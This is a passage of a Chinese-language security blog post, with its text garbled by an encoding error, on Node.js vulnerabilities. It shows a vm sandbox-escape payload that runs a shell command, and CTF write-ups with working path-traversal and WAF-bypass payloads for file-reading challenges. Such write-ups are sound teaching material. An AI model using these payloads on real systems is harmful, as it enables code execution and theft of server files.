  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
&#125;;
const untrusted = `($&#123;theFunction&#125;)()`;

console.log(saferEval(untrusted));
</code></pre>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç»™e postä¼ å…¥ä¸€ä¸‹å†…å®¹:</p>
<pre><code class="plsql">(function () &#123;
  const process = clearImmediate.constructor(&quot;return process;&quot;)();
  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
&#125;)()
</code></pre>
<p>æ­å»ºçš„dockerç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œæ”¾ä¸€å¼ åˆ«äººçš„å›¾å­<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668772542204-bf8936f4-0bf2-48b7-9fe6-112ba4a93c59.png" alt="o_20080607581121-1.png"></p>
<h2 id="æ›´å¤šé€ƒé€¸payload"><a href="#æ›´å¤šé€ƒé€¸payload" class="headerlink" title="æ›´å¤šé€ƒé€¸payload"></a>æ›´å¤šé€ƒé€¸payload</h2><p><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a><br><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
<h1 id="ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜"><a href="#ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜" class="headerlink" title="ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜"></a>ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜</h1><h2 id="CSIVITU-2020-File-Library"><a href="#CSIVITU-2020-File-Library" class="headerlink" title="CSIVITU 2020-File Library"></a>CSIVITU 2020-<strong>File Library</strong></h2><p>å®¹å™¨åœ°å€:<a target="_blank" rel="noopener" href="https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library">https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library</a><br>æˆ‘ä»¬å¾—åˆ°äº†ä»»åŠ¡çš„æºä»£ç ï¼š</p>
<pre><code class="javascript">const express = require(&#39;express&#39;);
const path = require(&#39;path&#39;);
const fs = require(&#39;fs&#39;);

const app = express();

const PORT = process.env.PORT || 3000;

app.listen(PORT, () =&gt; &#123;
   console.log(`Listening on port $&#123;PORT&#125;`);
&#125;);

app.get(&#39;/getFile&#39;, (req, res) =&gt; &#123;
   let &#123; file &#125; = req.query;
   console.log(&quot;file is: &quot;+file);
   if (!file) &#123;
       res.send(`file=$&#123;file&#125;\nFilename not specified!`);
       return;
   &#125;

   try &#123;

       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) &#123;
           res.send(`file=$&#123;file&#125;\nInvalid filename!`);
           return;
       &#125;
   &#125; catch (err) &#123;
       res.send(&#39;An error occured!&#39;);
       return;
   &#125;

   if (!allowedFileType(file)) &#123;
       res.send(`File type not allowed`);
       return;
   &#125;

   if (file.length &gt; 5) &#123;
       file = file.slice(0, 5);
   &#125;

   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
  console.log(&quot;returnedFile: &quot;+returnedFile);
   fs.readFile(returnedFile, (err) =&gt; &#123;
       if (err) &#123;
           if (err.code != &#39;ENOENT&#39;) console.log(err);
           res.send(&#39;An error occured!&#39;);
           return;
       &#125;

       res.sendFile(returnedFile);
   &#125;);
&#125;);

app.get(&#39;/*&#39;, (req, res) =&gt; &#123;
   res.sendFile(__dirname + &#39;/index.html&#39;);
&#125;);

function allowedFileType(file) &#123;
   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
console.log(&quot;index +1 is &quot;+file.indexOf(&#39;.&#39;) + 1);    
console.log(&quot;format inside allowedfile is: &quot;+format);
   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;
       return true;
   &#125;

   return false;
&#125;
</code></pre>
<p>æˆ‘æ·»åŠ äº†ä¸€äº›æ—¥å¿—è®°å½•è¯­å¥ä»¥æ–¹ä¾¿æ“ä½œï¼Œæ­£å¦‚æ‚¨æ‰€è§ï¼Œå½“æˆ‘ä»¬è®¿é—®**/getfile**æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ get å‚æ•°ä¸­æä¾›ä¸€ä¸ªå°†ä¸ºæˆ‘ä»¬æ˜¾ç¤ºçš„æ–‡ä»¶åï¼Œä½†æœ‰ä¸€äº›é™åˆ¶ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ç©ºæ ¼æˆ–â€œ/â€ï¼Œåªå…è®¸å››ä¸ªæ‰©å±•å (js|ts|c|cpp) ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>ä»”ç»†é˜…è¯»æºä»£ç åï¼Œæˆ‘å¾ˆç¡®å®šæˆ‘ä»¬ä¼šä½¿ç”¨ http å‚æ•°æ±¡æŸ“ï¼Œå› ä¸ºæ²¡æœ‰æ£€æŸ¥ get å‚æ•°çš„ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªæ•°ç»„å¹¶å°è¯•åˆ©ç”¨å¯èƒ½å‘ç”Ÿçš„ä¸å½“è¡Œä¸ºã€‚<br>å‡è®¾æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹æ•°ç»„ï¼š</p>
<pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]
</code></pre>
<ul>
<li><strong>ç¬¬ä¸€æ¬¡æ£€æŸ¥</strong>ï¼šif (file.includes(â€˜ â€˜) || file.includes(â€˜/â€˜))</li>
</ul>
<p>å½“ includes åº”ç”¨äºæ•°ç»„æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æ˜¯å¦æœ‰ä¸€ä¸ªå­—æ®µç­‰äºä¼ é€’çš„å‚æ•°ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ä¸ºâ€œâ€å’Œâ€œ/â€ï¼‰ï¼Œè¿™é‡Œä¸º falseï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æˆåŠŸé€šè¿‡æ­¤æ£€æŸ¥</p>
<ul>
<li><strong>ç¬¬äºŒæ¬¡æ£€æŸ¥</strong>ï¼šif (!allowedFileType(file))</li>
</ul>
<p>æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼š</p>
<pre><code class="javascript">function allowedFileType(file) &#123;
const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;
        return true;
    &#125;

    return false;
&#125;
</code></pre>
<p>å®ƒå°†ä» indexOf(â€œ.â€)+1 å¼€å§‹å¯¹æˆ‘ä»¬çš„æ•°ç»„è¿›è¡Œåˆ‡ç‰‡ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç»“æœå°†æ˜¯æˆ‘ä»¬æ•°ç»„çš„æœ€åä¸€ä¸ªå­—æ®µï¼Œå³â€œjsâ€ï¼Œæˆ‘ä»¬ä¹Ÿå°†é€šè¿‡æ­¤æ£€æŸ¥ï¼š<br>ä»¥ä¸‹è¡Œå°†åˆ é™¤æ•°ç»„çš„æœ€åä¸¤ä¸ªå­—æ®µï¼š</p>
<pre><code class="javascript">if (file.length &gt; 5) &#123;
  file = file.slice(0, 5);
&#125;

# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬çš„æ•°ç»„å°†å˜æˆï¼š</p>
<pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]
</code></pre>
<p>æœ€ååœ¨è§£æè·¯å¾„å returnedFile å°†åŒ…å« /proc/self/cwd/flag.txt</p>
<pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong>ç”±äºæˆ‘ä»¬çš„â€œ../../â€å­—æ®µï¼Œå½“å‰ç›®å½•çš„__dirname è¢«å¿½ç•¥ï¼Œè€Œ**/proc/self/cwd**ç­‰åŒäºå½“å‰ç›®å½•ã€‚<br>æ‰€ä»¥æœ€åæˆ‘ä»¬çš„æ•°ç»„å°†è¢«è§£æä¸ºæˆ‘ä»¬æƒ³è¦çš„è·¯å¾„ï¼Œè¿™æ˜¯æœ€ç»ˆçš„æœ‰æ•ˆè½½è·ï¼Œå®ƒåªæ˜¯å¯¹æˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„çš„ä¸€ç§è§£é‡Šï¼š</p>
<pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js
</code></pre>
<h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>æŒ‘æˆ˜ä¸ºæˆ‘ä»¬æä¾›äº†<a target="_blank" rel="noopener" href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">æºä»£ç </a>å’Œä¸€ä¸ªDockerfile. ç”±äº Instancer åªåˆ›å»ºä¸€ä¸ªæŒç»­ 3 åˆ†é’Ÿçš„æŒ‘æˆ˜å®ä¾‹ï¼Œè¿™éå¸¸ä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨æä¾›çš„èµ„æºåœ¨æœ¬åœ°æ„å»ºå’Œè°ƒè¯•ä»¥ç©è¿™ä¸ªæŒ‘æˆ˜ã€‚<br>æµè§ˆç½‘ç«™localhost:3456ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ç½‘é¡µå±•ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>è¿™ä¸ªæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯è¯»å–flag.txtæ–‡ä»¶çš„å†…å®¹â€¦â€¦ä½†ä»¥æŸç§æ–¹å¼ç»•è¿‡includes(â€˜flagâ€™)wafçš„æ£€æŸ¥ã€‚æ‰€æœ‰çš„æŒ‘æˆ˜ä»£ç éƒ½å¯ä»¥åœ¨ çœ‹åˆ°main.js</p>
<pre><code class="javascript">const express = require(&quot;express&quot;);
const fs = require(&quot;fs&quot;);

const app = express();

const PORT = process.env.PORT || 3456;

app.use((req, res, next) =&gt; &#123;
    if([req.body, req.headers, req.query].some(
        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)
    )) &#123;
        return res.send(&quot;bad hacker!&quot;);
    &#125;
    next();
&#125;);

app.get(&quot;/&quot;, (req, res) =&gt; &#123;
    try &#123;
        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);
        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());       
    &#125;
    catch(err) &#123;
        console.log(err);
        res.status(500).send(&quot;Internal server error&quot;);
    &#125;
&#125;);

app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));
</code></pre>
<p><strong>åˆ†æ</strong><br>é˜…è¯»æºä»£ç åï¼Œæˆ‘æƒ³åˆ°äº†ä¸¤ä¸ªé—®é¢˜ã€‚</p>
<ol>
<li>å¦‚ä½•ç»•è¿‡includesæ¡ä»¶ï¼Ÿï¼ˆç»å¯¹â€¦â€¦æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„ä¸œè¥¿ï¼‰ï¼Œä»¥åŠ</li>
<li>readFileSyncè¯¥å‡½æ•°å¯ä»¥é‡‡ç”¨ä»€ä¹ˆç±»å‹çš„å‚æ•°æ¥è¯»å–æ–‡ä»¶ï¼Ÿ</li>
</ol>
<p>é€šè¿‡åœ¨ Google ä¸Šæœç´¢ï¼Œæˆ‘å‘ç°äº†ä¸€ç¯‡å…³äº<a target="_blank" rel="noopener" href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>çš„æ–‡ç« ï¼Œå®ƒåœ¨æŸäº›æ—¶å€™ç±»ä¼¼äºè¿™ä¸ªæŒ‘æˆ˜ï¼š</p>
<ul>
<li>è¿™ä¸¤ä¸ªæŒ‘æˆ˜éƒ½æ²¡æœ‰éªŒè¯è¾“å…¥çš„ç±»å‹ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†è¾“å…¥ä½œä¸ºæ•°ç»„è€Œä¸æ˜¯å­—ç¬¦ä¸²ä¼ é€’ï¼Œå¹¶ä¸”</li>
<li>è¿™ä¸¤ä¸ªæŒ‘æˆ˜éƒ½éœ€è¦ç»•è¿‡includeså‡½æ•°æ‰èƒ½åˆ°è¾¾æ ‡å¿—ï¼</li>
</ul>
<p>å¤ªæ£’äº†ï¼è®¤ä¸ºæˆ‘æ‰¾åˆ°äº†æ­£ç¡®çš„ä½ç½®ï¼Œæˆ‘å°è¯•äº† payload file[]=x&amp;file[]=flag.txtã€‚ä¸å¹¸çš„æ˜¯ï¼Œå®ƒæ— æ³•ç»•è¿‡è¿™ä¸ªæŒ‘æˆ˜çš„waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>ä¸ºä»€ä¹ˆå®ƒä¸èƒ½ç»•è¿‡wafï¼Ÿå¥½å§ï¼Œæˆ‘å‘ç°è¿™è¡Œä»£ç çš„æŒ‘æˆ˜ä¹‹é—´æœ‰ä¸€ä¸ªå…³é”®çš„ä¸åŒç‚¹<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(â€œflagâ€)<br>simplewafä¸é‡‡ç”¨åŸå§‹è¾“å…¥æ¥æ‰§è¡Œè¾“å…¥éªŒè¯ï¼Œè€Œæ˜¯é¢„å…ˆå°†åŸå§‹è¾“å…¥è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²<strong>ã€‚</strong>å› æ­¤ï¼Œè¯¥includeså‡½æ•°ä»ç„¶å¯ä»¥æ£€æŸ¥è½¬æ¢åçš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«flagã€‚<br>è‡³æ­¤ï¼Œæˆ‘æ— è®ºå¦‚ä½•ä¹Ÿæƒ³ä¸å‡ºç»•è¿‡è¿™ä¸ªincludeså‡½æ•°â€¦â€¦æ‰€ä»¥ï¼Œæˆ‘è½¬åˆ°ç¬¬äºŒä¸ªé—®é¢˜ï¼Œçœ‹çœ‹é‚£ä¸ªå‡½æ•°çš„NodeJSæ–‡æ¡£ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>å¥½çš„ï¼Œæ‰€ä»¥è·¯å¾„å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ª<string> | <Buffer> | <URL> | <integer>. ä½†æ˜¯ï¼Œè¯·æ±‚æŸ¥è¯¢å€¼çš„ç±»å‹å§‹ç»ˆæ˜¯å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¦‚ä½•ä¼ å…¥readFileSyncå‡½æ•° aURLæˆ– anintegeræˆ– a ä»¥å¤–çš„ä»»ä½•å…¶ä»–å†…å®¹stringï¼Ÿ<br>èµ·åˆæƒ³åˆ°ï¼Œæˆ‘å°è¯•å°†å­—ç¬¦ä¸²æ ¼å¼åŒ–ä¸ºURL: <a target="_blank" rel="noopener" href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C">http://localhost:3456/wow.htmlã€‚å€’éœ‰ï¼Œä¸è¡Œ</a>~</integer></URL></Buffer></string></p>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png" alt="image.png"><br>åœæ­¢å¾’åŠ³çš„çŒœæµ‹ï¼Œæˆ‘å†³å®šåœ¨<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSyncä¸Šçš„ NodeJS æºä»£ç ä¸­ä»”ç»†æŸ¥çœ‹è¯¥åŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>ç¬¬ 469 è¡ŒåŠä»¥ä¸‹çš„ä»£ç ç‰‡æ®µæ‰§è¡Œè¯»å–æ–‡ä»¶è¿‡ç¨‹ï¼Œæ— éœ€æ·±å…¥ç ”ç©¶ã€‚æˆ‘ä»¬éœ€è¦æ·±å…¥ç ”ç©¶çš„è¦ç‚¹æ˜¯ç¬¬ 467 è¡Œçš„ä»£ç ã€‚é€šè¿‡ç ”ç©¶fs.openSyncå‡½æ•°æ¥è·Ÿè¸ªä»£ç ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>é€šè¿‡è°ƒæŸ¥getValidatedPathåŠŸèƒ½ç»§ç»­å…³æ³¨ã€‚</p>
<p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>æŒ‰ä½ä¸æ”¾ï¼Œè¿™é‡Œä¼šå‡ºç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ã€‚å› æ­¤ï¼Œå¦‚æœè¯¥fileURLOrPathå€¼ä¸ä¸º nullï¼Œå¹¶ä¸”å…¶ä¸­æœ‰ existshrefå’Œoriginï¼Œå®ƒå°†è°ƒç”¨ to fileURLToPathï¼Œå°†fileURLOrPathå€¼è½¬æ¢ä¸º URLã€‚è¿™å°±æ˜¯æˆ‘æƒ³è¯´çš„ï¼æˆ‘èƒ½æ„Ÿè§‰åˆ°æˆ‘èµ°çš„è·¯æ˜¯å¯¹çš„ï¼<br>è·å¾—åŠ¨åŠ›ï¼Œæˆ‘ç»§ç»­ç ”ç©¶è¿™ä¸ªfileURLToPathåŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>è¯¥å€¼çš„ä¸€ä¸ªé™„åŠ æ¡ä»¶fileURLOrPathæ˜¯å…¶åè®®å¿…é¡»æ˜¯file:. å…¨éƒ¨æ£€æŸ¥é€šè¿‡åï¼Œä¼šè°ƒç”¨ç›¸åº”çš„å‡½æ•°ä»URLä¸­è·å–è·¯å¾„ã€‚ç”±äºæˆ‘åœ¨ Linux ä¸Šè°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ç»§ç»­ç ”ç©¶è¯¥getPathFromURLPosixåŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>å†æ¬¡æ£€æŸ¥æ­¤ä»£ç ç‰‡æ®µï¼šhostnameå¿…é¡»ä¸ºç©ºã€‚ä½†æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä»¶å€¼å¾—æ³¨æ„çš„äº‹æƒ…ï¼Œå®ƒå°†å¸®åŠ©æˆ‘ä»¬ç»•è¿‡ simplewaf çš„includesæ£€æŸ¥ï¼Œé‚£å°±æ˜¯å®ƒå°†å¯¹<strong>simplewaf</strong>pathnameæ‰§è¡Œ URL è§£ç ä»¥è·å– URLã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬pathnameä» Web åº”ç”¨ç¨‹åºä¼ é€’ä¸€ä¸ªåŒ URL ç¼–ç å€¼ï¼Œå®ƒæœ€ç»ˆå°†æ–‡ä»¶è·¯å¾„å˜æˆçº¯æ–‡æœ¬ã€‚ä½ çŒœæ€ä¹ˆç€ï¼Ÿç”±äºå®¢æˆ·ç«¯ä¼ é€’ç»™includesæ£€æŸ¥çš„å€¼åªæ˜¯ URL è§£ç ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è½»æ¾ç»•è¿‡æ­¤æ£€æŸ¥ã€‚<br>å¥½çš„ï¼Œè®©æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹å°†æœ‰æ•ˆå‚æ•°fileä½œä¸º URLä¼ é€’ç»™å‡½æ•°readFileSyncéœ€è¦åšçš„æ‰€æœ‰äº‹æƒ…ã€‚</p>
<ul>
<li>fileä¸ä¸ºç©º</li>
<li>file.originå­˜åœ¨</li>
<li>file.hrefå­˜åœ¨</li>
<li>file.protocol = â€˜file:â€™</li>
<li>file.hostname = â€˜â€™</li>
</ul>
<p>ç»•è¿‡wafå¹¶è·å¾—æ ‡å¿—çš„æœ€ç»ˆè¦æ±‚æ˜¯ï¼š</p>
<ul>
<li>file.pathnameæ˜¯åŒé‡ URL ç¼–ç </li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong><br>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘æ„é€ äº†å¦‚ä¸‹çš„payloadï¼š<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>æˆ‘åªæ˜¯å¯¹å­—ç¬¦è¿›è¡ŒåŒé‡ URL ç¼–ç gä»¥ç»•è¿‡ wafã€‚ä½¿ç”¨æœ‰æ•ˆè½½è·ï¼Œæˆ‘ä»¬æˆåŠŸè·å¾—äº†æµ‹è¯•æ ‡å¿—ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>å¥½å§ï¼Œå…ˆæ‹¿çœŸæ——å§~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p>
<h2 id="ç¥¥äº‘æ¯2022-RUSTwaf"><a href="#ç¥¥äº‘æ¯2022-RUSTwaf" class="headerlink" title="ç¥¥äº‘æ¯2022 RUSTwaf"></a>ç¥¥äº‘æ¯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
const app = express();
const bodyParser = require(&quot;body-parser&quot;)
const fs = require(&quot;fs&quot;)
app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));
const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);

app.post(&#39;/readfile&#39;, function (req, res) &#123;
    let body = req.body.toString();
    let file_to_read = &quot;app.js&quot;;
    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;
        encoding: &#39;utf-8&#39;
    &#125;).trim();
    try &#123;
        file_to_read = JSON.parse(file)
    &#125; catch (e)&#123;
        file_to_read = file
    &#125;
    let data = fs.readFileSync(file_to_read);
    res.send(data.toString());
&#125;);

app.get(&#39;/&#39;, function (req, res) &#123;
    res.send(&#39;see `/src`&#39;);
&#125;);



app.get(&#39;/src&#39;, function (req, res) &#123;
    var data = fs.readFileSync(&#39;app.js&#39;);
    res.send(data.toString());
&#125;);

app.listen(3000, function () &#123;
    console.log(&#39;start listening on port 3000&#39;);
&#125;);
</code></pre>
<p>ç›´æ¥/readfileè¯»æºç </p>
<pre><code class="javascript">use std::env;
use serde::&#123;Deserialize, Serialize&#125;;
use serde_json::Value;

static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;

#[derive(Debug, Serialize, Deserialize)]
struct File&#123;
    #[serde(default = &quot;default_protocol&quot;)]
    pub protocol: String,
    pub href: String,
    pub origin: String,
    pub pathname: String,
    pub hostname:String
&#125;

pub fn default_protocol() -&gt; String &#123;
    &quot;http&quot;.to_string()
&#125;
//protocol is default value,can&#39;t be customized
pub fn waf(body: &amp;str) -&gt; String &#123;
    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;
        return String::from(&quot;./main.rs&quot;); //è¿™é‡Œé™åˆ¶æˆ‘ä»¬ä¸èƒ½å¸¦æœ‰flagå’Œprocå­—æ®µ
    &#125;
    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;
        if let Some(json_body_obj) = json_body.as_object() &#123;
            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;
                return String::from(&quot;./main.rs&quot;);    //è¿™é‡Œé™åˆ¶æˆ‘ä»¬çš„jsonå­—æ®µä¸èƒ½å¸¦æœ‰protocolå­—æ®µï¼Œä½†æ˜¯ä¸‹é¢é™åˆ¶æˆ‘ä»¬æ˜¯fileç»“æ„ä½“ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸€å®šè¦æœ‰protocolå­—æ®µ
            &#125;
        &#125;
        //not contains protocol,check if struct is File
        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//é™åˆ¶æˆ‘ä»¬åªèƒ½æ˜¯è¿™ä¸ªç»“æ„ä½“
            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));
        &#125;
    &#125; else&#123;
        //body not json
        return String::from(body);
    &#125;
    return String::from(&quot;./main.rs&quot;);
&#125;

fn main() &#123;
    let args: Vec&lt;String&gt; = env::args().collect();
    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //è¿™é‡ŒæŠŠjsonçš„ç¬¬äºŒå­—æ®µä¼ è¿›å»
&#125;
</code></pre>
<p>å°†payloadä»¥jsonæ ¼å¼ä¼ ï¼Œä½†æ˜¯è¿™é‡Œç”¨åˆ°çš„payloadä¸­å­˜åœ¨protocolå¯¼è‡´rustèƒ½æ£€æµ‹åˆ°ï¼Œè¦åˆ©ç”¨unicode ç»•è¿‡<br>æœ€ç»ˆpayloadï¼š</p>
<pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;
</code></pre>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">æœ¬æ–‡ä½œè€…ï¼š</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">æœ¬æ–‡é“¾æ¥ï¼š</span><span class="p-copytight-value"><a href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/11/20/NodeJsæ¼æ´æ€»ç»“/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">ç‰ˆæƒå£°æ˜ï¼š</span><span class="p-copytight-value">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹æ®Šå£°æ˜å¤–ï¼Œå‡é‡‡ç”¨<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ <a href="https://sakurahack-y.github.io">sakuraçš„åšå®¢</a>ï¼</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/node-js/">node_js</a></span></div><aside id="toc"><div class="toc-title">ç›®å½•</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nodejs%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">Nodejsè¯­è¨€ç‰¹æ€§</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 